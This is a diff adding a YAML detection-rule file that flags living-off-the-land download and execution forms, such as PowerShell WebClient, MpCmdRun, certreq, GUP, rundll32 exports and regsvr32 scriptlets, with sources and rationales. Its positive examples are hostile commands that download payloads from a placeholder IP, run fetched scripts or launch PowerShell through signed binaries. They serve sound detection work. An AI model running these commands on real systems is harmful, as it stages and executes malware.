@@ -1,0 +1,884 @@
+# Mention patterns for signed-binary and script-host download and execution forms (living off the land): download
+# to disk through PowerShell, BITS-adjacent and vendor binaries, scriptlet and HTA execution, and the rundll32 export
+# family. Sources are SigmaHQ rules and LOLBAS entries at pinned commits, cited per entry. Download forms are strong
+# only with a URL argument where the binary has no ordinary download use; forms that installers and administrators
+# use (INF installs, url.dll, Control_RunDLL, curl.exe) are medium or weak.
+
+- id: mention.lolbin_webclient_downloadfile
+  title: PowerShell WebClient '.DownloadFile(' text with a URL
+  match:
+    anchored: '\.DownloadFile\( {0,2}["'']?(?:https?|ftp)://'
+  case_sensitive: false
+  strength: medium
+  attack: [T1105, T1059.001]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: PowerShell Download Via Net.WebClient - PowerShell Classic (Florian Roth, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/powershell/powershell_classic/posh_pc_download_via_webclient.yml
+    license: DRL-1.1
+    upstream_id: 3236fcd0-b7e3-4433-b4f8-86ad61a9af2d
+  rationale: >-
+    The rule's Net.WebClient '.DownloadFile(' form with the URL argument: a payload written to disk for a later
+    step. The rule itself notes patch-management tools and updaters do the same, so it is medium; the destination
+    path and URL host decide.
+  examples:
+    positive:
+      - 'powershell -c "(New-Object System.Net.WebClient).DownloadFile(''http://203.0.113.7/u.exe'', ''C:\Users\Public\u.exe'')"'
+    negative:
+      - 'powershell -c "$wc = New-Object System.Net.WebClient; $wc.Headers.Add(''User-Agent'',''inventory'')"'
+      - 'Nov 21 10:00:00 sccm01 CcmExec: Download of content PS100012 completed to C:\Windows\ccmcache\a'
+
+- id: mention.lolbin_invoke_webrequest_outfile_user_path
+  title: Invoke-WebRequest -OutFile into a user, temp or Windows path
+  match:
+    anchored: 'Invoke-WebRequest [^\n]{0,200}-O(?:utFile|utF|ut|u)? {1,3}["'']?[^\n"'' ]{0,40}(?:\\AppData\\|\\Desktop\\|\\Temp\\|\\Users\\Public\\|%AppData%|%Public%|%Temp%|%tmp%|\$env:TEMP|\$env:APPDATA|\$env:PUBLIC|:\\Windows\\)'
+  case_sensitive: false
+  strength: medium
+  attack: [T1105, T1059.001]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Suspicious Invoke-WebRequest Execution (Nasreddine Bencherchali, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_powershell_invoke_webrequest_download.yml
+    license: DRL-1.1
+    upstream_id: 5e3cc4d8-3e68-43db-8656-eaaeefdec9cc
+  rationale: >-
+    The rule's command, output flag and suspicious-location selections in their usual order: a download saved under
+    AppData, Desktop, Temp, Public or the Windows directory. Installer scripts also stage into Temp, so it is medium
+    (high upstream); the URL host decides.
+  examples:
+    positive:
+      - 'powershell -c "Invoke-WebRequest -Uri http://203.0.113.7/a.exe -OutFile $env:TEMP\a.exe"'
+    negative:
+      - 'powershell -c "Invoke-WebRequest https://intranet.example.org/report.csv -OutFile D:\Reports\r.csv"'
+      - 'powershell -c "Invoke-WebRequest -Uri https://api.example.org/health -UseBasicParsing"'
+
+- id: mention.lolbin_iwr_outfile_user_path
+  title: iwr -OutFile into a user, temp or Windows path
+  match:
+    anchored: 'iwr [^\n]{0,200}-O(?:utFile|utF|ut|u)? {1,3}["'']?[^\n"'' ]{0,40}(?:\\AppData\\|\\Desktop\\|\\Temp\\|\\Users\\Public\\|%AppData%|%Public%|%Temp%|%tmp%|\$env:TEMP|\$env:APPDATA|\$env:PUBLIC|:\\Windows\\)'
+  case_sensitive: false
+  strength: medium
+  attack: [T1105, T1059.001]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Suspicious Invoke-WebRequest Execution (Nasreddine Bencherchali, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_powershell_invoke_webrequest_download.yml
+    license: DRL-1.1
+    upstream_id: 5e3cc4d8-3e68-43db-8656-eaaeefdec9cc
+  rationale: >-
+    The same selections with the iwr alias. Medium for the same reason as the long form.
+  examples:
+    positive:
+      - 'powershell.exe iwr -Uri http://203.0.113.7/b.ps1 -OutFile %TEMP%\b.ps1 -UseBasicParsing'
+    negative:
+      - 'powershell -c "iwr https://intranet.example.org/a.zip -OutFile D:\Staging\a.zip"'
+      - 'powershell -c "iwr https://api.example.org/health | Select-Object StatusCode"'
+
+- id: mention.lolbin_curl_exe_download
+  title: Windows curl.exe text with an output-file flag
+  match:
+    anchored: 'curl\.exe["'']? [^\n]{0,200}(?: -O| -o |--output|--remote-name)'
+  case_sensitive: false
+  strength: weak
+  attack: [T1105]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: File Download Via Curl.EXE (Florian Roth, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules-threat-hunting/windows/process_creation/proc_creation_win_curl_download.yml
+    license: DRL-1.1
+    upstream_id: 9a517fca-4ba3-4629-9278-a68694697b81
+  rationale: >-
+    A threat-hunting rule: the built-in curl.exe saving a remote file. Admin and developer scripts (and Git for
+    Windows) do it routinely, so it is a weak candidate; the URL host and output path decide. Matched without case
+    because Windows file names are case-insensitive (Curl.exe).
+  examples:
+    positive:
+      - 'C:\Windows\System32\curl.exe -k http://203.0.113.7/a.dll -o C:\Users\Public\a.dll'
+    negative:
+      - 'C:\Windows\System32\curl.exe -s https://api.example.org/health'
+      - 'C:\Windows\System32\curl.exe --version'
+
+- id: mention.lolbin_desktopimgdownldr_url
+  title: 'desktopimgdownldr /lockscreenurl: argument with a URL'
+  match:
+    anchored: 'desktopimgdownldr(?:\.exe)?["'']? [^\n]{0,60}/lockscreenurl:["'']?(?:https?|ftp)://'
+  case_sensitive: false
+  strength: strong
+  attack: [T1105, T1218]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Remote File Download Via Desktopimgdownldr Utility (Tim Rauch, Elastic idea)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_desktopimgdownldr_remote_file_download.yml
+    license: DRL-1.1
+    upstream_id: 214641c2-c579-4ecb-8427-0cf19df6842e
+  rationale: >-
+    The lock-screen image downloader pointed at an arbitrary URL from a command line (LOLBAS Desktopimgdownldr) is a
+    signed-binary file download; the personalization service uses it without a command-line URL.
+  examples:
+    positive:
+      - 'set "SYSTEMROOT=C:\Windows\Temp" && cmd /c desktopimgdownldr.exe /lockscreenurl:http://203.0.113.7/a.exe /eventName:desktopimgdownldr'
+    negative:
+      - 'Nov 21 10:01:00 ws01 svchost: Personalization CSP applied lock screen image C:\Windows\Web\Screen\img100.jpg'
+      - 'C:\Windows\System32\desktopimgdownldr.exe /?'
+
+- id: mention.lolbin_mpcmdrun_downloadfile
+  title: MpCmdRun -DownloadFile -url text
+  match:
+    anchored: 'MpCmdRun(?:\.exe)?["'']? [^\n]{0,60}-DownloadFile [^\n]{0,60}-url {1,3}["'']?(?:https?|ftp)://'
+  case_sensitive: false
+  strength: strong
+  attack: [T1105, T1218]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: File Download Via Windows Defender MpCmpRun.EXE (Matthew Matchen)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_mpcmdrun_download_arbitrary_file.yml
+    license: DRL-1.1
+    upstream_id: 46123129-1024-423e-9fae-43af4a0fa9a5
+  rationale: >-
+    Defender's command-line utility fetching an arbitrary URL to a path (LOLBAS MpCmdRun) is a signed download
+    channel; signature updates use -SignatureUpdate, not -DownloadFile. The rule rates false positives as unknown.
+  examples:
+    positive:
+      - 'MpCmdRun.exe -DownloadFile -url http://203.0.113.7/a.exe -path C:\Users\Public\a.exe'
+    negative:
+      - '"C:\Program Files\Windows Defender\MpCmdRun.exe" -SignatureUpdate -MMPC'
+      - '"C:\Program Files\Windows Defender\MpCmdRun.exe" -Scan -ScanType 1'
+
+- id: mention.lolbin_certreq_post_url
+  title: certreq -Post -config text with a URL
+  match:
+    anchored: 'certreq(?:\.exe)?["'']? [^\n]{0,40}[-/]Post [^\n]{0,40}[-/]config {1,3}["'']?(?:https?|ftp)://'
+  case_sensitive: false
+  strength: strong
+  attack: [T1105, T1048]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Suspicious CertReq Command to Download (Christian Burkard, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_certreq_download.yml
+    license: DRL-1.1
+    upstream_id: 4480827a-9799-4232-b2c4-ccc6c4e9e12b
+  rationale: >-
+    certreq posting a file to an HTTP 'config' target and saving the response (LOLBAS CertReq) uploads and downloads
+    files under a signed binary. Enrollment uses a CA config string, not an http URL; the rule rates false positives
+    as unlikely.
+  examples:
+    positive:
+      - 'CertReq -Post -config http://203.0.113.7/ C:\Windows\win.ini C:\Users\Public\out.txt'
+    negative:
+      - 'certreq -submit -config "ca01.corp.example.org\CORP-CA" req.csr cert.cer'
+      - 'certreq -new request.inf request.req'
+
+- id: mention.lolbin_imewdbld_url
+  title: IMEWDBLD.exe text with a URL argument
+  match:
+    anchored: 'IMEWDBLD(?:\.exe)?["'']? {1,3}["'']?(?:https?|ftp)://'
+  case_sensitive: false
+  strength: strong
+  attack: [T1105, T1218]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Network Connection Initiated By IMEWDBLD.EXE (frack113)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/network_connection/net_connection_win_imewdbld.yml
+    license: DRL-1.1
+    upstream_id: 8d7e392e-9b28-49e1-831d-5949c6281228
+  rationale: >-
+    The IME dictionary builder caches whatever URL it is given; the rule flags any network connection it makes. The
+    command-line form with a URL is the download abuse; the binary has no administrative command-line use.
+  examples:
+    positive:
+      - 'C:\Windows\System32\IME\SHARED\IMEWDBLD.exe http://203.0.113.7/a.exe'
+    negative:
+      - 'Nov 21 10:02:00 ws01 MsiInstaller: Product: Microsoft Japanese IME -- Configuration completed successfully.'
+      - 'C:\Windows\System32\IME\SHARED\IMEWDBLD.exe'
+
+- id: mention.lolbin_gup_unzipto_url
+  title: Notepad++ GUP -unzipTo text with a URL
+  match:
+    anchored: 'GUP\.exe["'']? [^\n]{0,40}-unzipTo [^\n]{0,200}(?:https?|ftp)://'
+  case_sensitive: false
+  strength: medium
+  attack: [T1105, T1218]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: File Download Using Notepad++ GUP Utility (Nasreddine Bencherchali, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_gup_download.yml
+    license: DRL-1.1
+    upstream_id: 44143844-0631-49ab-97a0-96387d6b2d7c
+  rationale: >-
+    Notepad++'s updater told to fetch and unzip an arbitrary URL. Notepad++'s own Plugins Admin builds the same
+    command ('GUP.exe -unzipTo [-clean] <npp> <plugins dir> "<folder> <repo URL> <id>"') for every plugin install, and
+    the rule's parent-process exclusion cannot be seen in free text, so it is medium; a destination outside the
+    Notepad++ plugins directory or a URL outside the plugin list's hosts is the lead, and a temp, Public, ProgramData or AppData
+    destination is the separate strong entry.
+  examples:
+    positive:
+      - 'GUP.exe -unzipTo "" "C:\Users\Public" "x http://203.0.113.7/a.zip 0123456789abcdef"'
+    negative:
+      - '"C:\Program Files\Notepad++\updater\GUP.exe" -v8.6.9'
+      - '"C:\Program Files\Notepad++\updater\GUP.exe" -options'
+
+- id: mention.lolbin_gup_unzipto_temp_destination
+  title: Notepad++ GUP -unzipTo text with a URL and a temp, Public, ProgramData or AppData destination
+  match:
+    anchored: 'GUP\.exe["'']? {1,3}-unzipTo (?:-clean )?"[^"\n]{0,120}" {1,3}"(?:[A-Za-z]:\\Temp|[A-Za-z]:\\Users\\Public|[A-Za-z]:\\ProgramData|%TEMP%|%APPDATA%|%PUBLIC%|[A-Za-z]:\\Windows\\Temp|(?:(?:[A-Za-z]:|\\\\)[\w .$\\-]{1,60}|%USERPROFILE%|%HOMEDRIVE%%HOMEPATH%)\\AppData\\)[^"\n]{0,60}" {1,3}"[\w .+()-]{0,80}(?:https?|ftp)://'
+  case_sensitive: false
+  strength: strong
+  attack: [T1105, T1218]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: File Download Using Notepad++ GUP Utility (Nasreddine Bencherchali, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_gup_download.yml
+    license: DRL-1.1
+    upstream_id: 44143844-0631-49ab-97a0-96387d6b2d7c
+  rationale: >-
+    The GUP download form with an unzip destination in Temp, Public, ProgramData or AppData. Notepad++'s Plugins
+    Admin always unzips into the Notepad++ plugins directory, so this destination is the abuse; the medium entry
+    covers every other GUP download.
+  examples:
+    positive:
+      - 'GUP.exe -unzipTo "" "C:\Temp" "x http://203.0.113.7/a.zip 0123456789abcdef"'
+    negative:
+      - '"C:\Program Files\Notepad++\updater\GUP.exe" -unzipTo -clean "C:\Program Files\Notepad++" "C:\Program Files\Notepad++\plugins" "ComparePlugin https://www.example.com/pnedev/comparePlugin/releases/download/v2.0.2/ComparePlugin_v2.0.2_X64.zip 5a1e2b"'
+      - '"C:\Program Files\Notepad++\updater\GUP.exe" -options'
+
+- id: mention.lolbin_onedrive_updater_url_setting
+  title: OneDrive UpdateRingSettingURLFromOC registry value name
+  match:
+    literal: ['UpdateRingSettingURLFromOC']
+  case_sensitive: false
+  strength: strong
+  attack: [T1105, T1218]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Lolbas OneDriveStandaloneUpdater.exe Proxy Download (frack113)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/registry/registry_set/registry_set_lolbin_onedrivestandaloneupdater.yml
+    license: DRL-1.1
+    upstream_id: 3aff0be0-7802-4a7e-a4fa-c60c74bc5e1d
+  rationale: >-
+    Setting this value points OneDriveStandaloneUpdater at an arbitrary URL that it then downloads (LOLBAS
+    OneDriveStandaloneUpdater). Office configuration does not write it by hand; the rule rates false positives as
+    unknown.
+  examples:
+    positive:
+      - 'reg add "HKCU\Software\Microsoft\OneDrive\UpdateOfficeConfig" /v UpdateRingSettingURLFromOC /t REG_SZ /d "http://203.0.113.7/a.zip" /f'
+    negative:
+      - 'Nov 21 10:03:00 ws01 OneDriveStandaloneUpdater: Update check completed, current version 24.201.1006.0005'
+      - 'reg query "HKCU\Software\Microsoft\OneDrive" /v Version'
+
+- id: mention.lolbin_nimgrab_name
+  title: nimgrab downloader name
+  match:
+    literal: ['nimgrab.exe']
+  case_sensitive: false
+  strength: medium
+  attack: [T1105]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: PUA - Nimgrab Execution (frack113)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_pua_nimgrab.yml
+    license: DRL-1.1
+    upstream_id: 74a12f18-505c-4114-8d0b-8448dd5485c6
+  rationale: >-
+    nimgrab is a minimal Nim HTTP downloader used to pull tools onto Windows hosts. Nim developers can have it, so
+    it is medium as a potentially unwanted application.
+  examples:
+    positive:
+      - 'cmd /c C:\Users\Public\nimgrab.exe http://203.0.113.7/a.exe C:\Users\Public\a.exe'
+    negative:
+      - 'C:\Users\dev\.nimble\bin\nimble.exe install jester'
+      - 'Nov 21 10:04:00 ws01 MsiInstaller: Product: Nim 2.0 -- Installation completed successfully.'
+
+- id: mention.lolbin_nscurl_download
+  title: macOS nscurl text with a download or output option
+  match:
+    anchored: 'nscurl [^\n]{0,120}(?:--download |--download-directory |--output |-dir |-dl |-ld|-o )'
+  case_sensitive: true
+  strength: medium
+  attack: [T1105]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: File Download Via Nscurl - MacOS (Daniel Cortez)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/macos/process_creation/proc_creation_macos_nscurl_usage.yml
+    license: DRL-1.1
+    upstream_id: 6d8a7cf1-8085-423b-b87d-7e880faabbdf
+  rationale: >-
+    Apple's nscurl saving a remote file: a less-watched downloader on macOS. Administrators use it to test ATS
+    settings, which seldom involves saving output, so it is medium.
+  examples:
+    positive:
+      - 'Nov 21 10:05:00 mac01 zsh[700]: HISTORY: nscurl -k "http://203.0.113.7/a" -o /tmp/a'
+    negative:
+      - 'Nov 21 10:05:01 mac01 zsh[701]: HISTORY: nscurl --ats-diagnostics https://www.example.org'
+      - 'Nov 21 10:05:02 mac01 zsh[702]: HISTORY: curl -o /tmp/a.zip https://downloads.example.org/a.zip'
+
+- id: mention.lolbin_msxml_com_http
+  title: PowerShell -ComObject MsXml2 XmlHttp text
+  match:
+    anchored: '-ComObject {1,3}["'']?MsXml2\.(?:Server)?XmlHttp'
+  case_sensitive: false
+  strength: medium
+  attack: [T1105, T1059.001]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Powershell MsXml COM Object (frack113, MatilJ)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/powershell/powershell_script/posh_ps_msxml_com.yml
+    license: DRL-1.1
+    upstream_id: 78aa1347-1517-4454-9982-b338d6df8343
+  rationale: >-
+    Fetching content through the MsXml2 XMLHTTP COM object avoids the usual PowerShell web cmdlets and their logging.
+    Legacy administrative scripts still use it, so it is medium as upstream.
+  examples:
+    positive:
+      - 'powershell -c "$x=New-Object -ComObject MsXml2.ServerXmlHttp;$x.Open(''GET'',''http://203.0.113.7/a.ps1'',$false);$x.Send();IEX $x.ResponseText"'
+    negative:
+      - 'powershell -c "$doc = New-Object -ComObject Msxml2.DOMDocument.6.0; $doc.load(''C:\cfg\app.xml'')"'
+      - 'powershell -c "Invoke-RestMethod https://api.example.org/items"'
+
+- id: mention.lolbin_rundll32_vbscript
+  title: 'rundll32 text with a vbscript: argument'
+  match:
+    anchored: 'rundll32(?:\.exe)?["'']? {1,3}["'']?vbscript:'
+  case_sensitive: false
+  strength: strong
+  attack: [T1218.011, T1059.005]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Suspicious Rundll32 Invoking Inline VBScript (Florian Roth, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_rundll32_inline_vbs.yml
+    license: DRL-1.1
+    upstream_id: 1cc50f3f-1fc8-4acf-b2e9-6f172e1fdebd
+  rationale: >-
+    The rule's inline-VBScript case keyed on its protocol handler: rundll32 given a vbscript: argument runs script
+    through mshtml (Poweliks-style). Windows components never start rundll32 with a vbscript: argument.
+  examples:
+    positive:
+      - 'rundll32.exe vbscript:"\..\mshtml,#135 "+String(CreateObject("WScript.Shell").Run("powershell -nop -c whoami"),0)'
+    negative:
+      - 'rundll32.exe shell32.dll,Control_RunDLL desk.cpl'
+      - 'C:\Windows\System32\rundll32.exe C:\Windows\System32\printui.dll,PrintUIEntry /il'
+
+- id: mention.lolbin_wscript_shell_run_inline
+  title: 'Inline ''Wscript.Shell'' and ''.Run'' text'
+  match:
+    anchored: 'Wscript\.Shell["'')]{0,6}\.Run\b'
+  case_sensitive: false
+  strength: medium
+  attack: [T1059.005, T1218.005]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Wscript Shell Run In CommandLine (Nasreddine Bencherchali, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_mshta_inline_vbscript.yml
+    license: DRL-1.1
+    upstream_id: 2c28c248-7f50-417a-9186-a85b223010ee
+  rationale: >-
+    CreateObject("Wscript.Shell").Run written inline on a command line, the usual body of mshta about: and vbscript:
+    one-liners that launch PowerShell. The rule notes rare third-party and administrator inline scripting, so it is
+    medium.
+  examples:
+    positive:
+      - 'mshta.exe "about:<hta:application><script language=""VBScript"">Close(Execute(""CreateObject(""""Wscript.Shell"""").Run """"powershell -nop -c whoami"""""")))</script>"'
+    negative:
+      - 'cscript.exe //nologo C:\Scripts\inventory.vbs'
+      - 'wscript.exe "C:\Program Files\Vendor\logon.vbs"'
+
+- id: mention.lolbin_regsvr32_scrobj_scriptlet
+  title: 'regsvr32 /i: scriptlet text with scrobj.dll'
+  match:
+    anchored: 'regsvr32(?:\.exe)?["'']? [^\n]{0,60}[/-]i:[^\n]{0,200}scrobj\.dll'
+  case_sensitive: false
+  strength: strong
+  attack: [T1218.010]
+  telemetry: [any]
+  source:
+    name: LOLBAS project, Regsvr32.exe
+    url: https://github.com/LOLBAS-Project/LOLBAS/blob/98a39d57b0a3873d635cd5594f2dbffa83891bc3/yml/OSBinaries/Regsvr32.yml
+    license: GPL-3.0
+    upstream_id: Regsvr32.exe
+  rationale: >-
+    'regsvr32 /s /u /i:<scriptlet> scrobj.dll' runs a COM scriptlet, local or remote; the remote form is the
+    separate Squiblydoo cradle entry. COM registration of real components never routes through scrobj.dll with /i.
+  examples:
+    positive:
+      - 'regsvr32.exe /s /u /i:C:\Users\Public\x.sct scrobj.dll'
+    negative:
+      - 'regsvr32.exe /s "C:\Program Files\Vendor\plugin.dll"'
+      - 'regsvr32 /u /s "C:\Program Files\Vendor\old.ocx"'
+
+- id: mention.lolbin_rundll32_advpack_inf
+  title: rundll32 advpack or ieadvpack LaunchINFSection or RegisterOCX text
+  match:
+    literal: ['advpack.dll,LaunchINFSection', 'advpack.dll,RegisterOCX', 'advpack.dll, RegisterOCX']
+  case_sensitive: false
+  strength: medium
+  attack: [T1218.011]
+  telemetry: [any]
+  source:
+    name: LOLBAS project, Advpack.dll and Ieadvpack.dll
+    url: https://github.com/LOLBAS-Project/LOLBAS/blob/98a39d57b0a3873d635cd5594f2dbffa83891bc3/yml/OSLibraries/Advpack.yml
+    license: GPL-3.0
+    upstream_id: Advpack.dll
+  rationale: >-
+    advpack and ieadvpack exports install an INF section or run a program as an 'OCX'; LOLBAS documents both as
+    proxy execution. The literals also cover ieadvpack.dll, whose name ends in the same text. Older installers use
+    LaunchINFSection legitimately, so it is medium; the INF path decides.
+  examples:
+    positive:
+      - 'rundll32.exe advpack.dll,LaunchINFSection C:\Users\Public\x.inf,DefaultInstall_SingleUser,1,'
+      - 'rundll32.exe ieadvpack.dll,RegisterOCX C:\Users\Public\x.exe'
+    negative:
+      - 'rundll32.exe shell32.dll,Control_RunDLL desk.cpl'
+      - 'Nov 21 10:06:00 ws01 MsiInstaller: Product: Vendor Driver Pack -- Installation completed successfully.'
+
+- id: mention.lolbin_rundll32_syssetup_inf
+  title: rundll32 syssetup SetupInfObjectInstallAction text
+  match:
+    literal: ['syssetup.dll,SetupInfObjectInstallAction', 'syssetup,SetupInfObjectInstallAction']
+  case_sensitive: false
+  strength: medium
+  attack: [T1218.011]
+  telemetry: [any]
+  source:
+    name: LOLBAS project, Syssetup.dll
+    url: https://github.com/LOLBAS-Project/LOLBAS/blob/98a39d57b0a3873d635cd5594f2dbffa83891bc3/yml/OSLibraries/Syssetup.yml
+    license: GPL-3.0
+    upstream_id: Syssetup.dll
+  rationale: >-
+    Installing an INF through syssetup's export runs the commands the INF lists (LOLBAS Syssetup). Setup programs
+    rarely call it from a command line, so it is medium.
+  examples:
+    positive:
+      - 'rundll32 syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 C:\Users\Public\x.inf'
+    negative:
+      - 'rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 132 C:\Drivers\net\netdrv.inf'
+      - 'pnputil /add-driver C:\Drivers\net\netdrv.inf /install'
+
+- id: mention.lolbin_rundll32_setupapi_inf
+  title: rundll32 setupapi InstallHinfSection text
+  match:
+    literal: ['setupapi.dll,InstallHinfSection', 'setupapi,InstallHinfSection']
+  case_sensitive: false
+  strength: weak
+  attack: [T1218.011]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Suspicious Rundll32 Setupapi.dll Activity (Konstantin Grishchenko, oscd.community)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_rundll32_setupapi_installhinfsection.yml
+    license: DRL-1.1
+    upstream_id: 285b85b1-a555-4095-8652-a8a4106af63f
+  rationale: >-
+    InstallHinfSection runs an INF's commands (LOLBAS Setupapi). Driver and software installers call it constantly,
+    and the rule itself needs a runonce.exe child to be suspicious, so it is a weak candidate; the INF path decides.
+  examples:
+    positive:
+      - 'rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 C:\Users\Public\x.inf'
+    negative:
+      - 'rundll32 syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 C:\Drivers\a.inf'
+      - 'pnputil /enum-drivers'
+
+- id: mention.lolbin_rundll32_pcwutl
+  title: rundll32 pcwutl LaunchApplication text
+  match:
+    literal: ['pcwutl.dll,LaunchApplication', 'pcwutl,LaunchApplication']
+  case_sensitive: false
+  strength: medium
+  attack: [T1218.011]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Code Execution via Pcwutl.dll (Julia Fomina, oscd.community)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_lolbin_pcwutl.yml
+    license: DRL-1.1
+    upstream_id: 9386d78a-7207-4048-9c9f-a93a7c2d1c05
+  rationale: >-
+    The Program Compatibility helper's LaunchApplication export starts any program under rundll32. The Program
+    Compatibility Troubleshooter uses it, so it is medium as upstream.
+  examples:
+    positive:
+      - 'rundll32.exe pcwutl.dll,LaunchApplication C:\Users\Public\x.exe'
+    negative:
+      - 'msdt.exe -id PCWDiagnostic'
+      - 'rundll32.exe shell32.dll,Control_RunDLL appwiz.cpl'
+
+- id: mention.lolbin_rundll32_zipfldr_routethecall
+  title: rundll32 zipfldr RouteTheCall text
+  match:
+    literal: ['zipfldr.dll,RouteTheCall', 'zipfldr,RouteTheCall']
+  case_sensitive: false
+  strength: medium
+  attack: [T1218.011]
+  telemetry: [any]
+  source:
+    name: LOLBAS project, Zipfldr.dll
+    url: https://github.com/LOLBAS-Project/LOLBAS/blob/98a39d57b0a3873d635cd5594f2dbffa83891bc3/yml/OSLibraries/Zipfldr.yml
+    license: GPL-3.0
+    upstream_id: Zipfldr.dll
+  rationale: >-
+    The compressed-folder handler's RouteTheCall export launches an arbitrary program (LOLBAS Zipfldr). Older Windows
+    releases registered 'rundll32.exe zipfldr.dll,RouteTheCall %L' as the open handler for zip files, and I cannot
+    rule out current file associations that still do, so it is medium; an executable or script argument is the
+    separate strong entry.
+  examples:
+    positive:
+      - 'rundll32.exe zipfldr.dll,RouteTheCall C:\Users\Public\x.exe'
+      - 'rundll32 zipfldr,RouteTheCall C:\Users\Public\x.exe'
+    negative:
+      - 'explorer.exe C:\Users\alice\Downloads\report.zip'
+      - 'powershell -c "Expand-Archive C:\Temp\a.zip -DestinationPath C:\Temp\a"'
+
+- id: mention.lolbin_rundll32_zipfldr_routethecall_program
+  title: zipfldr RouteTheCall text with an executable or script argument
+  match:
+    anchored: 'zipfldr(?:\.dll)?, {0,1}RouteTheCall {1,3}[^\n]{0,200}\.(?:exe|scr|bat|cmd|com|ps1|vbs|js|hta)\b'
+  case_sensitive: false
+  strength: strong
+  attack: [T1218.011]
+  telemetry: [any]
+  source:
+    name: LOLBAS project, Zipfldr.dll
+    url: https://github.com/LOLBAS-Project/LOLBAS/blob/98a39d57b0a3873d635cd5594f2dbffa83891bc3/yml/OSLibraries/Zipfldr.yml
+    license: GPL-3.0
+    upstream_id: Zipfldr.dll
+  rationale: >-
+    RouteTheCall given an executable or script instead of a zip file: the LOLBAS proxy-execution form. The legacy
+    zip-file association passes the .zip path being opened, so this argument type separates abuse from the handler.
+  examples:
+    positive:
+      - 'rundll32.exe zipfldr.dll,RouteTheCall C:\Users\Public\x.exe'
+    negative:
+      - 'rundll32.exe zipfldr.dll,RouteTheCall C:\Users\alice\Downloads\report.zip'
+      - 'explorer.exe C:\Users\alice\Downloads\report.zip'
+
+- id: mention.lolbin_rundll32_url_dll
+  title: 'url.dll OpenURL or FileProtocolHandler text with a file, UNC or script target'
+  match:
+    anchored: 'url\.dll, {0,1}(?:OpenURL|FileProtocolHandler) {1,3}[\"'']?(?:file:|\\\\|[A-Za-z]:\\|%[A-Za-z]{1,20}%|[^\s\"]{0,200}\.(?:hta|exe|url|vbs|js|bat|cmd|ps1|scr|lnk|dll)\b)'
+  case_sensitive: false
+  strength: medium
+  attack: [T1218.011]
+  telemetry: [any]
+  source:
+    name: LOLBAS project, Url.dll
+    url: https://github.com/LOLBAS-Project/LOLBAS/blob/98a39d57b0a3873d635cd5594f2dbffa83891bc3/yml/OSLibraries/Url.yml
+    license: GPL-3.0
+    upstream_id: Url.dll
+  rationale: >-
+    url.dll's OpenURL and FileProtocolHandler exports open whatever they are given, including .hta and .exe files
+    (LOLBAS Url). With a file:, UNC, drive or script/executable target it is proxy execution, medium. Applications
+    open web links in the default browser the same way, so an http(s) target is the separate weak entry.
+  examples:
+    positive:
+      - 'rundll32.exe url.dll,OpenURL C:\Users\Public\x.hta'
+      - 'rundll32.exe url.dll,FileProtocolHandler C:\Users\Public\x.exe'
+    negative:
+      - 'rundll32.exe shell32.dll,OpenAs_RunDLL C:\Temp\a.log'
